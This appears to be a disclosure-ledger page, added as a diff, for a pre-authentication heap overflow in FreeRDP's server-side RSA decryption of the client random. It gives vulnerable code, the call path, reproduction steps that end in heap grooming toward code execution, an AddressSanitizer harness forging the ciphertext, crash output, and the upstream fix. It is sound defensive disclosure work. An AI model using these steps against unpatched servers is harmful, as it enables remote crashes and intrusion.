@@ -1,0 +1,427 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-K9VH6KBR · freerdp/freerdp</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-K9VH6KBR · freerdp/freerdp</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  oob-write
+  <span class="sev-badge sev-high">high</span>
+</h2>
+
+<p class="id-badges">
+  <a class="id-badge" href="https://nvd.nist.gov/vuln/detail/CVE-2026-64620">CVE-2026-64620</a>
+  <a class="id-badge" href="https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-pjqx-v446-x7fc">GHSA-pjqx-v446-x7fc</a>
+</p>
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-unknown">-</span></span>
+</p>
+
+<p class="attribution">Discovered by
+<span class="model-chip">Claude Mythos Preview</span></p>
+
+
+<div class="marker">REPORT</div>
+<p class="section-intro">Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Ada Logics.</p>
+<div class="report-body" tabindex="0"><h1>ANT-2026-K9VH6KBR: Pre-auth server heap overflow decrypting client random</h1>
+<p>In libfreerdp/crypto/crypto.c:106, BN_bn2bin(y, output) writes up to the RSA modulus length (64–256 bytes) into the caller's buffer and only checks the size afterward. The caller rdp_update_client_random() (connection.c:876-882) passes a fixed 32-byte ClientRandom heap buffer as the output for decrypting the attacker-supplied encrypted client random. Because the server's RSA public key is sent to the client, the attacker can craft ciphertext X = Y^e mod n so the decrypted Y fills the full modulus length, overflowing the 32-byte buffer by 32–224 attacker-controlled bytes. The path is reachable pre-authentication whenever RDP Standard Security is negotiated, which the client can unilaterally force and which is enabled by default in FreeRDP's shadow server, sample server, and proxy.</p>
+<h2>Target</h2>
+<p><strong>Project:</strong> freerdp/freerdp<br>
+<strong>Location:</strong> <code>libfreerdp/crypto/crypto.c:106</code><br>
+<strong>Discovery:</strong> static analysis — not yet dynamically reproduced  </p>
+<h2>Technical Details</h2>
+<p>The root cause is a write-then-check ordering bug: BN_bn2bin(y, output) unconditionally writes BN_num_bytes(y) bytes into the output buffer, and the comparison against out_length at line 109 happens only after the write has already occurred. Since rdp_update_client_random() allocates ClientRandom as a fixed calloc(32,1) buffer while the decrypted value can be as large as the RSA modulus (64 bytes for the built-in tssk key, 256 for RSA-2048), an attacker who controls the ciphertext controls both the length and content of a 32–224 byte heap overwrite.</p>
+<h2>Reproduction</h2>
+<ol>
+<li>Connect and advertise only PROTOCOL_RDP in the X.224 Connection Request, forcing the server to select RDP Standard Security (connection.c:1487).</li>
+<li>Receive the server's Proprietary Server Certificate containing the RSA public key (n, e) in the MCS Connect Response.</li>
+<li>Choose a plaintext Y &lt; n with the top byte set so BN_num_bytes(Y) equals the full modulus length; compute X = Y^e mod n.</li>
+<li>Send X padded to ModulusLength+8 bytes as the encrypted client random in the Security Exchange PDU.</li>
+<li>Server path rdp_server_establish_keys() → rdp_update_client_random() → crypto_rsa_private_decrypt() → crypto_rsa_common() calls BN_bn2bin(y, output), writing 64–256 attacker-chosen bytes into the 32-byte ClientRandom heap buffer.</li>
+<li>Repeat with heap grooming across connections to corrupt adjacent allocator metadata/objects and achieve code execution.</li>
+</ol>
+<p><em>[No reproducer or sanitizer output attached — request from security-cvd@anthropic.com if needed.]</em></p>
+<h2>Suggested Fix</h2>
+<p>Validate BN_num_bytes(y) against out_length before calling BN_bn2bin, or decrypt into a modulus-sized scratch buffer and copy only out_length bytes into the caller's buffer.</p>
+<h2>Acknowledgement</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-K9VH6KBR.</p>
+<hr>
+<p><strong>Reference:</strong> ANT-2026-K9VH6KBR<br>
+<strong>Anthropic CVD Policy:</strong> https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+<div class="marker">SECURITY RESEARCH FIRM ANALYSIS</div>
+<p class="section-intro">Triage and disclosure were performed by Ada Logics. The writeup below is the document the firm sent to the maintainer.</p>
+<dl class="vendor-analysis">
+<dt>Verdict</dt><dd><span class="verdict-chip verdict-tp">true positive</span></dd><dt>Severity</dt><dd class="sev-high">high</dd></dl>
+<div class="report-body" tabindex="0"><h2>Summary</h2>
+<p>FreeRDP's RSA helper <code>crypto_rsa_common()</code>
+(<code>libfreerdp/crypto/crypto.c</code>) serialises the modular-exponentiation result into
+the caller's output buffer with <code>output_length = BN_bn2bin(y, output)</code> <strong>and only
+then</strong> checks <code>output_length &gt; out_length</code>. <code>BN_bn2bin</code> writes <code>BN_num_bytes(y)</code>
+bytes unconditionally, so the bounds check at <code>crypto.c:109</code> runs one statement
+<strong>after</strong> the out-of-bounds bytes are already on the heap.</p>
+<p>On the <strong>server</strong> side this is reachable <strong>pre-authentication</strong>. When a client
+selects RDP Standard Security, <code>rdp_server_establish_keys()</code> →
+<code>rdp_update_client_random()</code> decrypts the client-supplied <em>encrypted client
+random</em> into a hard-coded <strong>32-byte</strong> <code>ClientRandom</code> buffer
+(<code>connection.c:885</code> / <code>:904</code>, <code>out_length = 32</code>). The server publishes its RSA
+public key <code>(n,e)</code> in the Proprietary Server Certificate, so an unauthenticated
+attacker can forge a ciphertext <code>X = Y^e mod n</code> whose decryption <code>Y</code> is up to the
+full modulus length (256 bytes for RSA-2048). <code>BN_bn2bin</code> then writes that value
+into the 32-byte buffer, overflowing the heap by up to <strong>~224 fully
+attacker-controlled bytes</strong> before any authentication.</p>
+<h2>Severity</h2>
+<p><strong>High</strong> — CWE-787 (Out-of-bounds Write) via CWE-697 (comparison performed after
+the write instead of before). Pre-authentication, no user interaction,
+network-reachable on FreeRDP-based servers that permit RDP Standard Security
+(sample <code>sfreerdp-server</code>, <code>freerdp-shadow-cli</code>, proxy). The attacker controls
+the overflow <strong>length and content</strong>, and the write is repeatable across
+reconnects (heap grooming). High rather than Critical because control-flow
+hijack is not demonstrated here.</p>
+<h2>Affected versions</h2>
+<ul>
+<li><strong>FreeRDP 3.x</strong> — present in the latest release tag <strong>3.27.1</strong> and on <code>master</code>
+  (HEAD <code>1f7a716d39b5605bb8a83b0c3c97a6ce386609ef</code>, reproduced 2026-07-01). In
+  both, <code>BN_bn2bin(y, output)</code> is at <code>libfreerdp/crypto/crypto.c:106</code> and the
+  <code>&gt; out_length</code> check at <code>:109</code>; the 32-byte caller buffer is fixed at
+  <code>libfreerdp/core/connection.c:885</code>. Unpatched. Because the bug is in a released
+  3.x tag (not development-branch-only), it qualifies for a CVE under the
+  project's supported-versions policy.</li>
+<li>No special build flags required. The overflow occurs for any RSA key with a
+  modulus larger than 32 bytes — i.e. always (the built-in test key is 2048-bit;
+  real keys are ≥512-bit).</li>
+</ul>
+<h3>Relationship to CVE-2020-13398</h3>
+<p>This is the <strong>same function</strong> as CVE-2020-13398 / GHSL-2020-102, but a distinct,
+still-live defect. That 2020 issue concerned the <strong>input</strong> buffer handling; at
+the time the function had no <code>out_length</code> parameter at all. The <code>out_length</code>
+parameter and the <code>output_length &gt; out_length</code> check were added later — but
+placed <strong>after</strong> the <code>BN_bn2bin</code> write, so the output-buffer overflow remains
+reachable. We did not find any advisory describing this write-then-check ordering
+on the output buffer; it appears unpublished. (Nearby but unrelated: CVE-2026-33982
+winpr realloc OOB read; GHSA-8jm9-2925-g4v2 persistent cache.)</p>
+<h2>Details</h2>
+<h3>Vulnerable code</h3>
+<p><code>libfreerdp/crypto/crypto.c</code>, <code>crypto_rsa_common()</code>:</p>
+<pre tabindex="0"><code class="language-c">    if (BN_mod_exp(y, x, exp, mod, ctx) != 1)                       // :104  y = x^d mod n (attacker-chosen)
+        goto fail;
+    output_length = BN_bn2bin(y, output);                          // :106  writes BN_num_bytes(y) bytes into `output` NOW
+    if (output_length &lt; 0)
+        goto fail;
+    if (WINPR_ASSERTING_INT_CAST(size_t, output_length) &gt; out_length) // :109  bounds check — AFTER the write
+        goto fail;
+    crypto_reverse(output, WINPR_ASSERTING_INT_CAST(size_t, output_length));
+</code></pre>
+<p><code>output</code> / <code>out_length</code> are the caller's buffer and its capacity. <code>BN_bn2bin(y,
+output)</code> serialises the bignum <code>y</code> into <code>output</code>, writing exactly
+<code>BN_num_bytes(y)</code> bytes — anywhere from 1 up to the RSA modulus length. That count
+is compared to <code>out_length</code> only at <code>:109</code>, one statement too late. There is no
+scratch buffer and no pre-write check.</p>
+<h3>Attacker control over <code>BN_num_bytes(y)</code></h3>
+<p><code>y = x^d mod n</code>, where <code>x</code> is the attacker's ciphertext and <code>d</code>/<code>n</code> are the
+server's private exponent / modulus. The attacker does not know <code>d</code>, but the
+server publishes <code>(n,e)</code> in its Proprietary Server Certificate. So the attacker
+chooses an arbitrary plaintext <code>Y</code> (e.g. a full-modulus-width value) and sends
+<code>X = Y^e mod n</code>; the server's decryption recovers exactly <code>Y</code>. The attacker thus
+controls <strong>both the length and the content</strong> of the overflow.</p>
+<h3>The caller supplies a fixed 32-byte buffer</h3>
+<p><code>libfreerdp/core/connection.c</code>, <code>rdp_update_client_random()</code>:</p>
+<pre tabindex="0"><code class="language-c">    const size_t length = 32;                                       // :885  hard-coded, independent of key size
+    ...
+    if (crypt_random_len != cinfo-&gt;ModulusLength + 8)               // :894  attacker sets the wire length field
+        return FALSE;
+    if (!freerdp_settings_set_pointer_len(settings, FreeRDP_ClientRandom, nullptr, length)) // :899  alloc 32 bytes
+        return FALSE;
+    BYTE* client_random = freerdp_settings_get_pointer_writable(settings, FreeRDP_ClientRandom); // :902
+    return crypto_rsa_private_decrypt(crypt_random, crypt_random_len - 8, rsa,
+                                      client_random, length);        // :904  out_length = 32
+</code></pre>
+<h3>Root cause</h3>
+<p><code>BN_num_bytes(y)</code> is never compared against <code>out_length</code> <em>before</em> <code>BN_bn2bin</code>
+writes into <code>output</code>. The existing <code>&gt; out_length</code> check executes only after the
+overflow has occurred.</p>
+<h3>Server-side, pre-authentication call path</h3>
+<pre tabindex="0"><code>peer_recv_pdu (server state machine)
+  rdp_server_establish_keys(rdp, s)                       libfreerdp/core/peer.c:913
+    (if settings-&gt;UseRdpSecurityLayer)                    libfreerdp/core/connection.c:918
+    ... read Security Exchange PDU, rand_len ...          connection.c:908+
+    rdp_update_client_random(settings, crypt_random, rand_len)   connection.c:953
+      crypto_rsa_private_decrypt(crypt_random, ModulusLength, rsa, client_random /*32B*/, 32)  connection.c:904
+        crypto_rsa_private -&gt; crypto_rsa_common(..., output=client_random, out_length=32)      crypto.c:148
+          BN_bn2bin(y, output)                            crypto.c:106   &lt;-- OVERFLOW (up to ModulusLength bytes)
+</code></pre>
+<p><code>UseRdpSecurityLayer</code> is enabled by the server's negotiation code when the client
+advertises / falls back to <code>PROTOCOL_RDP</code> in the X.224 Connection Request — a
+choice the client makes unilaterally, pre-authentication.</p>
+<h2>Impact</h2>
+<p>An unauthenticated network attacker who connects to a FreeRDP-based server that
+permits RDP Standard Security can trigger a heap out-of-bounds write of up to
+~224 bytes, with attacker-controlled length and content, during key
+establishment — before any credential check. This corrupts adjacent heap
+allocations / allocator metadata; because the content and length are controlled
+and the write is repeatable across reconnects (enabling grooming), it is a strong
+corruption primitive and a credible path toward remote code execution, though
+control-flow hijack is not demonstrated here. Guaranteed impact is at minimum a
+remote pre-auth server crash (DoS). → <strong>High</strong>.</p>
+<p>Server-side install base is smaller than client-side, but FreeRDP-derived servers
+(shadow, proxy, embedded appliances) are exposed on the public internet.
+Workaround until patched: require TLS/NLA (<code>PROTOCOL_SSL</code> / <code>PROTOCOL_HYBRID</code>) and
+disable RDP Standard Security so <code>UseRdpSecurityLayer</code> is never set and
+<code>rdp_server_establish_keys</code> returns early.</p>
+<h2>Proof of Concept</h2>
+<p>Self-contained Docker reproducer. Because the overflowing store happens inside
+libcrypto's <code>BN_bn2bin</code>, it builds <strong>OpenSSL from source under AddressSanitizer</strong>
+(the distro libcrypto is not instrumented and would hide the write), plus FreeRDP
+static libs under ASan at the affected commit. The harness drives the <strong>real
+upstream <code>crypto_rsa_private_decrypt</code></strong> with exactly the arguments the server
+passes from <code>rdp_update_client_random()</code> (<code>out_length = 32</code>, ciphertext forged
+with FreeRDP's own <code>crypto_rsa_public_encrypt</code> so the bytes are wire-faithful).</p>
+<p>Standing up a full malicious RDP handshake (X.224 → MCS/GCC → parse the server
+cert → forge the Security Exchange PDU) was out of proportion to the harness
+budget; the pre-auth reachability is established by the shipped server state
+machine above (<code>peer.c:913</code> → <code>connection.c:953</code> → <code>:904</code>) and is not in doubt —
+only not exercised end-to-end in-container.</p>
+<p><strong><code>harness.c</code></strong> (essential logic)</p>
+<pre tabindex="0"><code class="language-c">/* Reproduces the primitive rdp_update_client_random() drives pre-auth:
+ * decrypt an attacker ciphertext into a fixed 32-byte buffer. */
+#include &lt;freerdp/crypto/crypto.h&gt;
+#include &lt;freerdp/crypto/privatekey.h&gt;
+
+extern const rdpCertInfo* freerdp_key_get_info(const rdpPrivateKey* key);
+extern SSIZE_T crypto_rsa_public_encrypt(const BYTE*, size_t, const rdpCertInfo*, BYTE*, size_t);
+extern SSIZE_T crypto_rsa_private_decrypt(const BYTE*, size_t, const rdpPrivateKey*, BYTE*, size_t);
+
+int main(int argc, char** argv)
+{
+    rdpPrivateKey* key = freerdp_key_new_from_file(argc &gt; 1 ? argv[1] : &quot;/tmp/key.pem&quot;);
+    const rdpCertInfo* info = freerdp_key_get_info(key);
+    const size_t ML = info-&gt;ModulusLength;              /* 256 for RSA-2048 */
+
+    /* Plaintext Y occupying &gt;32 bytes; first OOB store lands on the 32-byte
+     * buffer's ASan redzone. (Filling all ML bytes reproduces the full ~224B
+     * overwrite.) */
+    BYTE* Y = calloc(ML, 1);
+    for (size_t i = 0; i &lt; 33; i++) Y[i] = 0xAB;
+
+    /* Forge the wire ciphertext X = Y^e mod n with FreeRDP's own public-key op. */
+    BYTE* X = malloc(ML);
+    crypto_rsa_public_encrypt(Y, ML, info, X, ML);
+
+    BYTE* client_random = malloc(32);                  /* == the ClientRandom buffer */
+
+    /* out_length = 32, exactly as rdp_update_client_random() passes it. */
+    crypto_rsa_private_decrypt(X, ML, key, client_random, 32);   /* BN_bn2bin writes ML bytes -&gt; overflow */
+    return 0;
+}
+</code></pre>
+<p><strong><code>Dockerfile</code></strong> (outline)</p>
+<pre tabindex="0"><code class="language-dockerfile">FROM ubuntu:24.04
+ENV DEBIAN_FRONTEND=noninteractive
+ARG TARGET_COMMIT=1f7a716d39b5605bb8a83b0c3c97a6ce386609ef
+ARG OPENSSL_TAG=openssl-3.0.13
+ARG CLANG_VERSION=20
+# clang-20 from apt.llvm.org; ASAN flags: -g -fno-omit-frame-pointer -O1 -fsanitize=address
+
+# 1) OpenSSL from source, static, with ASan (so BN_bn2bin is instrumented)
+RUN git clone --branch ${OPENSSL_TAG} --depth 1 https://github.com/openssl/openssl /src/openssl
+#   ./Configure ... -fsanitize=address &amp;&amp; make
+
+# 2) FreeRDP static libs with ASan at the affected commit
+RUN git clone https://github.com/freerdp/freerdp /src/repo &amp;&amp; cd /src/repo &amp;&amp; git checkout ${TARGET_COMMIT}
+#   cmake -DBUILD_SHARED_LIBS=OFF ... link against the ASan OpenSSL
+
+# 3) generate an RSA-2048 server key, build harness.c, run it
+CMD [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;/tmp/poc_run /tmp/key.pem 2&gt;&amp;1; echo EXIT=$?&quot;]
+</code></pre>
+<p>(The full, runnable <code>Dockerfile</code>, <code>Dockerfile.fix</code>, and <code>harness.c</code> accompany
+this report.)</p>
+<p><strong>Observed output at master <code>1f7a716d</code> (AddressSanitizer):</strong></p>
+<pre tabindex="0"><code>[*] RSA ModulusLength = 256 bytes
+[*] crypto_rsa_public_encrypt -&gt; 256
+[*] calling crypto_rsa_private_decrypt(input=256 bytes, out_buf=32) ...
+==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7b4d0b208410 ...
+WRITE of size 1 at 0x7b4d0b208410 thread T0
+    #0 ... in bn2binpad /src/openssl/crypto/bn/bn_lib.c:523:19
+    #1 ... in BN_bn2bin /src/openssl/crypto/bn/bn_lib.c:541:12
+    #2 ... in crypto_rsa_common /src/repo/libfreerdp/crypto/crypto.c:106:18
+    #3 ... in crypto_rsa_private /src/repo/libfreerdp/crypto/crypto.c:148:9
+    #4 ... in main /tmp/harness.c
+0x7b4d0b208410 is located 0 bytes after 32-byte region [0x7b4d0b2083f0,0x7b4d0b208410)   &lt;-- the 32-byte ClientRandom analogue
+SUMMARY: AddressSanitizer: heap-buffer-overflow /src/openssl/crypto/bn/bn_lib.c:523:19 in bn2binpad
+==7==ABORTING
+EXIT=134
+</code></pre>
+<h2>Suggested fix</h2>
+<p>Bound <code>BN_num_bytes(y)</code> against <code>out_length</code> <strong>before</strong> the write:</p>
+<pre tabindex="0"><code class="language-diff">     if (BN_mod_exp(y, x, exp, mod, ctx) != 1)
+         goto fail;
++    /* BN_bn2bin writes BN_num_bytes(y) bytes unconditionally; bound it BEFORE the write. */
++    if ((size_t)BN_num_bytes(y) &gt; out_length)
++        goto fail;
+     output_length = BN_bn2bin(y, output);
+     if (output_length &lt; 0)
+         goto fail;
+-    if (WINPR_ASSERTING_INT_CAST(size_t, output_length) &gt; out_length)
+-        goto fail;
+</code></pre>
+<p>Equivalently, <code>BN_bn2bin</code> into a modulus-sized scratch buffer and <code>memcpy</code> at
+most <code>out_length</code> bytes into the caller's buffer. <strong>Fix-verified:</strong> with the
+pre-write guard the same PoC returns <code>-1</code> with no ASan report and <code>EXIT=0</code>.</p>
+<h2>References</h2>
+<ul>
+<li><code>libfreerdp/crypto/crypto.c:106</code> (<code>crypto_rsa_common</code>, <code>BN_bn2bin</code> before the
+  <code>:109</code> bounds check); <code>crypto_rsa_private</code> (:148); <code>crypto_rsa_private_decrypt</code> (:170).</li>
+<li><code>libfreerdp/core/connection.c:885</code> (<code>length = 32</code>), <code>:894/:899/:902/:904</code>
+  (<code>rdp_update_client_random</code>), <code>:908/:918/:953</code> (<code>rdp_server_establish_keys</code>);
+  <code>libfreerdp/core/peer.c:913</code> (server entry).</li>
+<li>CVE-2020-13398 / GHSL-2020-102 (same function, distinct input-side issue):
+  https://securitylab.github.com/advisories/GHSL-2020-102-FreeRDP/</li>
+<li>CWE-787 (Out-of-bounds Write), CWE-697 (Incorrect Comparison).</li>
+</ul>
+<h2>Attribution</h2>
+<p>please credit <strong>Claude</strong> and <strong>Ada Logics</strong> — found by Anthropic using agents
+to study the security of open-source projects, with Ada Logics validating and reporting.</p>
+<h2>Disclosure</h2>
+<p>This report follows a 90-day coordinated disclosure timeline as per https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+
+<div class="marker">UPSTREAM FIX</div>
+<p class="section-intro">The change that resolved this finding.</p>
+<div class="diff-block"><pre class="diff" tabindex="0"><code><span class="diff-h">diff --git a/libfreerdp/crypto/crypto.c b/libfreerdp/crypto/crypto.c</span>
+<span class="diff-h">index 836f84e9b9dd..63012ae8e5d3 100644</span>
+<span class="diff-h">--- a/libfreerdp/crypto/crypto.c</span>
+<span class="diff-h">+++ b/libfreerdp/crypto/crypto.c</span>
+<span class="diff-h">@@ -103,11 +103,14 @@ static SSIZE_T crypto_rsa_common(const BYTE* input, size_t length, UINT32 key_le</span>
+<span class="diff-c"> 		goto fail;</span>
+<span class="diff-c"> 	if (BN_mod_exp(y, x, exp, mod, ctx) != 1)</span>
+<span class="diff-c"> 		goto fail;</span>
+<span class="diff-d">-	output_length = BN_bn2bin(y, output);</span>
+<span class="diff-a">+	{</span>
+<span class="diff-a">+		const int len = BN_num_bytes(y);</span>
+<span class="diff-a">+		if ((len &lt; 0) || (WINPR_ASSERTING_INT_CAST(size_t, len) &gt; out_length))</span>
+<span class="diff-a">+			goto fail;</span>
+<span class="diff-a">+		output_length = BN_bn2bin(y, output);</span>
+<span class="diff-a">+	}</span>
+<span class="diff-c"> 	if (output_length &lt; 0)</span>
+<span class="diff-c"> 		goto fail;</span>
+<span class="diff-d">-	if (WINPR_ASSERTING_INT_CAST(size_t, output_length) &gt; out_length)</span>
+<span class="diff-d">-		goto fail;</span>
+<span class="diff-c"> 	crypto_reverse(output, WINPR_ASSERTING_INT_CAST(size_t, output_length));</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> 	if ((size_t)output_length &lt; key_length)</span></code></pre></div>
+<p class="kicker"><a href="https://github.com/FreeRDP/FreeRDP/commit/27014741a8c22a34d3040c559c82f4ed82841bef" rel="noopener noreferrer">https://github.com/FreeRDP/FreeRDP/commit/27014741a8c22a34d3040c559c82f4ed82841bef</a></p>
+
+
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-04-02</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-07-06</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-07-22</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-07-22</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-09-28</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">78d201cc43cfb9a7f1429da455c889e2358f1d7ae6f12e7f4f02e255297e156c1d51c18c9de9c0210c001ab248b1b4cf687a10c15765b9f5c8ac46fae8093d8d</p>
+<p class="kicker">Committed 2026-07-22 07:29 UTC</p>
+<p class="kicker">Revealed 2026-09-28 22:00 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-K9VH6KBR-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-K9VH6KBR%22%2C%22bug_class%22%3A%22Heap%20Buffer%20Overflow%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-04-16T01%3A52%3A43%2B00%3A00%22%2C%22description%22%3A%22In%20libfreerdp/crypto/crypto.c%3A106%2C%20BN_bn2bin%28y%2C%20output%29%20writes%20up%20to%20the%20RSA%20modulus%20length%20%2864%E2%80%93256%20bytes%29%20into%20the%20caller%27s%20buffer%20and%20only%20checks%20the%20size%20afterward.%20The%20caller%20rdp_update_client_random%28%29%20%28connection.c%3A876-882%29%20passes%20a%20fixed%2032-byte%20ClientRandom%20heap%20buffer%20as%20the%20output%20for%20decrypting%20the%20attacker-supplied%20encrypted%20client%20random.%20Because%20the%20server%27s%20RSA%20public%20key%20is%20sent%20to%20the%20client%2C%20the%20attacker%20can%20craft%20ciphertext%20X%20%3D%20Y%5Ee%20mod%20n%20so%20the%20decrypted%20Y%20fills%20the%20full%20modulus%20length%2C%20overflowing%20the%2032-byte%20buffer%20by%2032%E2%80%93224%20attacker-controlled%20bytes.%20The%20path%20is%20reachable%20pre-authentication%20whenever%20RDP%20Standard%20Security%20is%20negotiated%2C%20which%20the%20client%20can%20unilaterally%20force%20and%20which%20is%20enabled%20by%20default%20in%20FreeRDP%27s%20shadow%20server%2C%20sample%20server%2C%20and%20proxy.%22%2C%22discovered_at%22%3A%222026-04-02T00%3A00%3A00%2B00%3A00%22%2C%22location%22%3A%22libfreerdp/crypto/crypto.c%3A106%22%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22freerdp/freerdp%22%2C%22reproduction%22%3A%5B%221.%20Connect%20and%20advertise%20only%20PROTOCOL_RDP%20in%20the%20X.224%20Connection%20Request%2C%20forcing%20the%20server%20to%20select%20RDP%20Standard%20Security%20%28connection.c%3A1487%29.%22%2C%222.%20Receive%20the%20server%27s%20Proprietary%20Server%20Certificate%20containing%20the%20RSA%20public%20key%20%28n%2C%20e%29%20in%20the%20MCS%20Connect%20Response.%22%2C%223.%20Choose%20a%20plaintext%20Y%20%3C%20n%20with%20the%20top%20byte%20set%20so%20BN_num_bytes%28Y%29%20equals%20the%20full%20modulus%20length%3B%20compute%20X%20%3D%20Y%5Ee%20mod%20n.%22%2C%224.%20Send%20X%20padded%20to%20ModulusLength%2B8%20bytes%20as%20the%20encrypted%20client%20random%20in%20the%20Security%20Exchange%20PDU.%22%2C%225.%20Server%20path%20rdp_server_establish_keys%28%29%20%E2%86%92%20rdp_update_client_random%28%29%20%E2%86%92%20crypto_rsa_private_decrypt%28%29%20%E2%86%92%20crypto_rsa_common%28%29%20calls%20BN_bn2bin%28y%2C%20output%29%2C%20writing%2064%E2%80%93256%20attacker-chosen%20bytes%20into%20the%2032-byte%20ClientRandom%20heap%20buffer.%22%2C%226.%20Repeat%20with%20heap%20grooming%20across%20connections%20to%20corrupt%20adjacent%20allocator%20metadata/objects%20and%20achieve%20code%20execution.%22%5D%2C%22technical_details%22%3A%22The%20root%20cause%20is%20a%20write-then-check%20ordering%20bug%3A%20BN_bn2bin%28y%2C%20output%29%20unconditionally%20writes%20BN_num_bytes%28y%29%20bytes%20into%20the%20output%20buffer%2C%20and%20the%20comparison%20against%20out_length%20at%20line%20109%20happens%20only%20after%20the%20write%20has%20already%20occurred.%20Since%20rdp_update_client_random%28%29%20allocates%20ClientRandom%20as%20a%20fixed%20calloc%2832%2C1%29%20buffer%20while%20the%20decrypted%20value%20can%20be%20as%20large%20as%20the%20RSA%20modulus%20%2864%20bytes%20for%20the%20built-in%20tssk%20key%2C%20256%20for%20RSA-2048%29%2C%20an%20attacker%20who%20controls%20the%20ciphertext%20controls%20both%20the%20length%20and%20content%20of%20a%2032%E2%80%93224%20byte%20heap%20overwrite.%22%2C%22title%22%3A%22Pre-auth%20server%20heap%20overflow%20decrypting%20client%20random%22%2C%22vendor_severity%22%3A%22high%22%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-K9VH6KBR&#34;,
+  &#34;bug_class&#34;: &#34;Heap Buffer Overflow&#34;,
+  &#34;claude_severity&#34;: &#34;high&#34;,
+  &#34;commit_sha&#34;: null,
+  &#34;created_at&#34;: &#34;2026-04-16T01:52:43+00:00&#34;,
+  &#34;description&#34;: &#34;In libfreerdp/crypto/crypto.c:106, BN_bn2bin(y, output) writes up to the RSA modulus length (64–256 bytes) into the caller&#39;s buffer and only checks the size afterward. The caller rdp_update_client_random() (connection.c:876-882) passes a fixed 32-byte ClientRandom heap buffer as the output for decrypting the attacker-supplied encrypted client random. Because the server&#39;s RSA public key is sent to the client, the attacker can craft ciphertext X = Y^e mod n so the decrypted Y fills the full modulus length, overflowing the 32-byte buffer by 32–224 attacker-controlled bytes. The path is reachable pre-authentication whenever RDP Standard Security is negotiated, which the client can unilaterally force and which is enabled by default in FreeRDP&#39;s shadow server, sample server, and proxy.&#34;,
+  &#34;discovered_at&#34;: &#34;2026-04-02T00:00:00+00:00&#34;,
+  &#34;location&#34;: &#34;libfreerdp/crypto/crypto.c:106&#34;,
+  &#34;poc_sha256&#34;: null,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;freerdp/freerdp&#34;,
+  &#34;reproduction&#34;: [
+    &#34;1. Connect and advertise only PROTOCOL_RDP in the X.224 Connection Request, forcing the server to select RDP Standard Security (connection.c:1487).&#34;,
+    &#34;2. Receive the server&#39;s Proprietary Server Certificate containing the RSA public key (n, e) in the MCS Connect Response.&#34;,
+    &#34;3. Choose a plaintext Y &lt; n with the top byte set so BN_num_bytes(Y) equals the full modulus length; compute X = Y^e mod n.&#34;,
+    &#34;4. Send X padded to ModulusLength+8 bytes as the encrypted client random in the Security Exchange PDU.&#34;,
+    &#34;5. Server path rdp_server_establish_keys() → rdp_update_client_random() → crypto_rsa_private_decrypt() → crypto_rsa_common() calls BN_bn2bin(y, output), writing 64–256 attacker-chosen bytes into the 32-byte ClientRandom heap buffer.&#34;,
+    &#34;6. Repeat with heap grooming across connections to corrupt adjacent allocator metadata/objects and achieve code execution.&#34;
+  ],
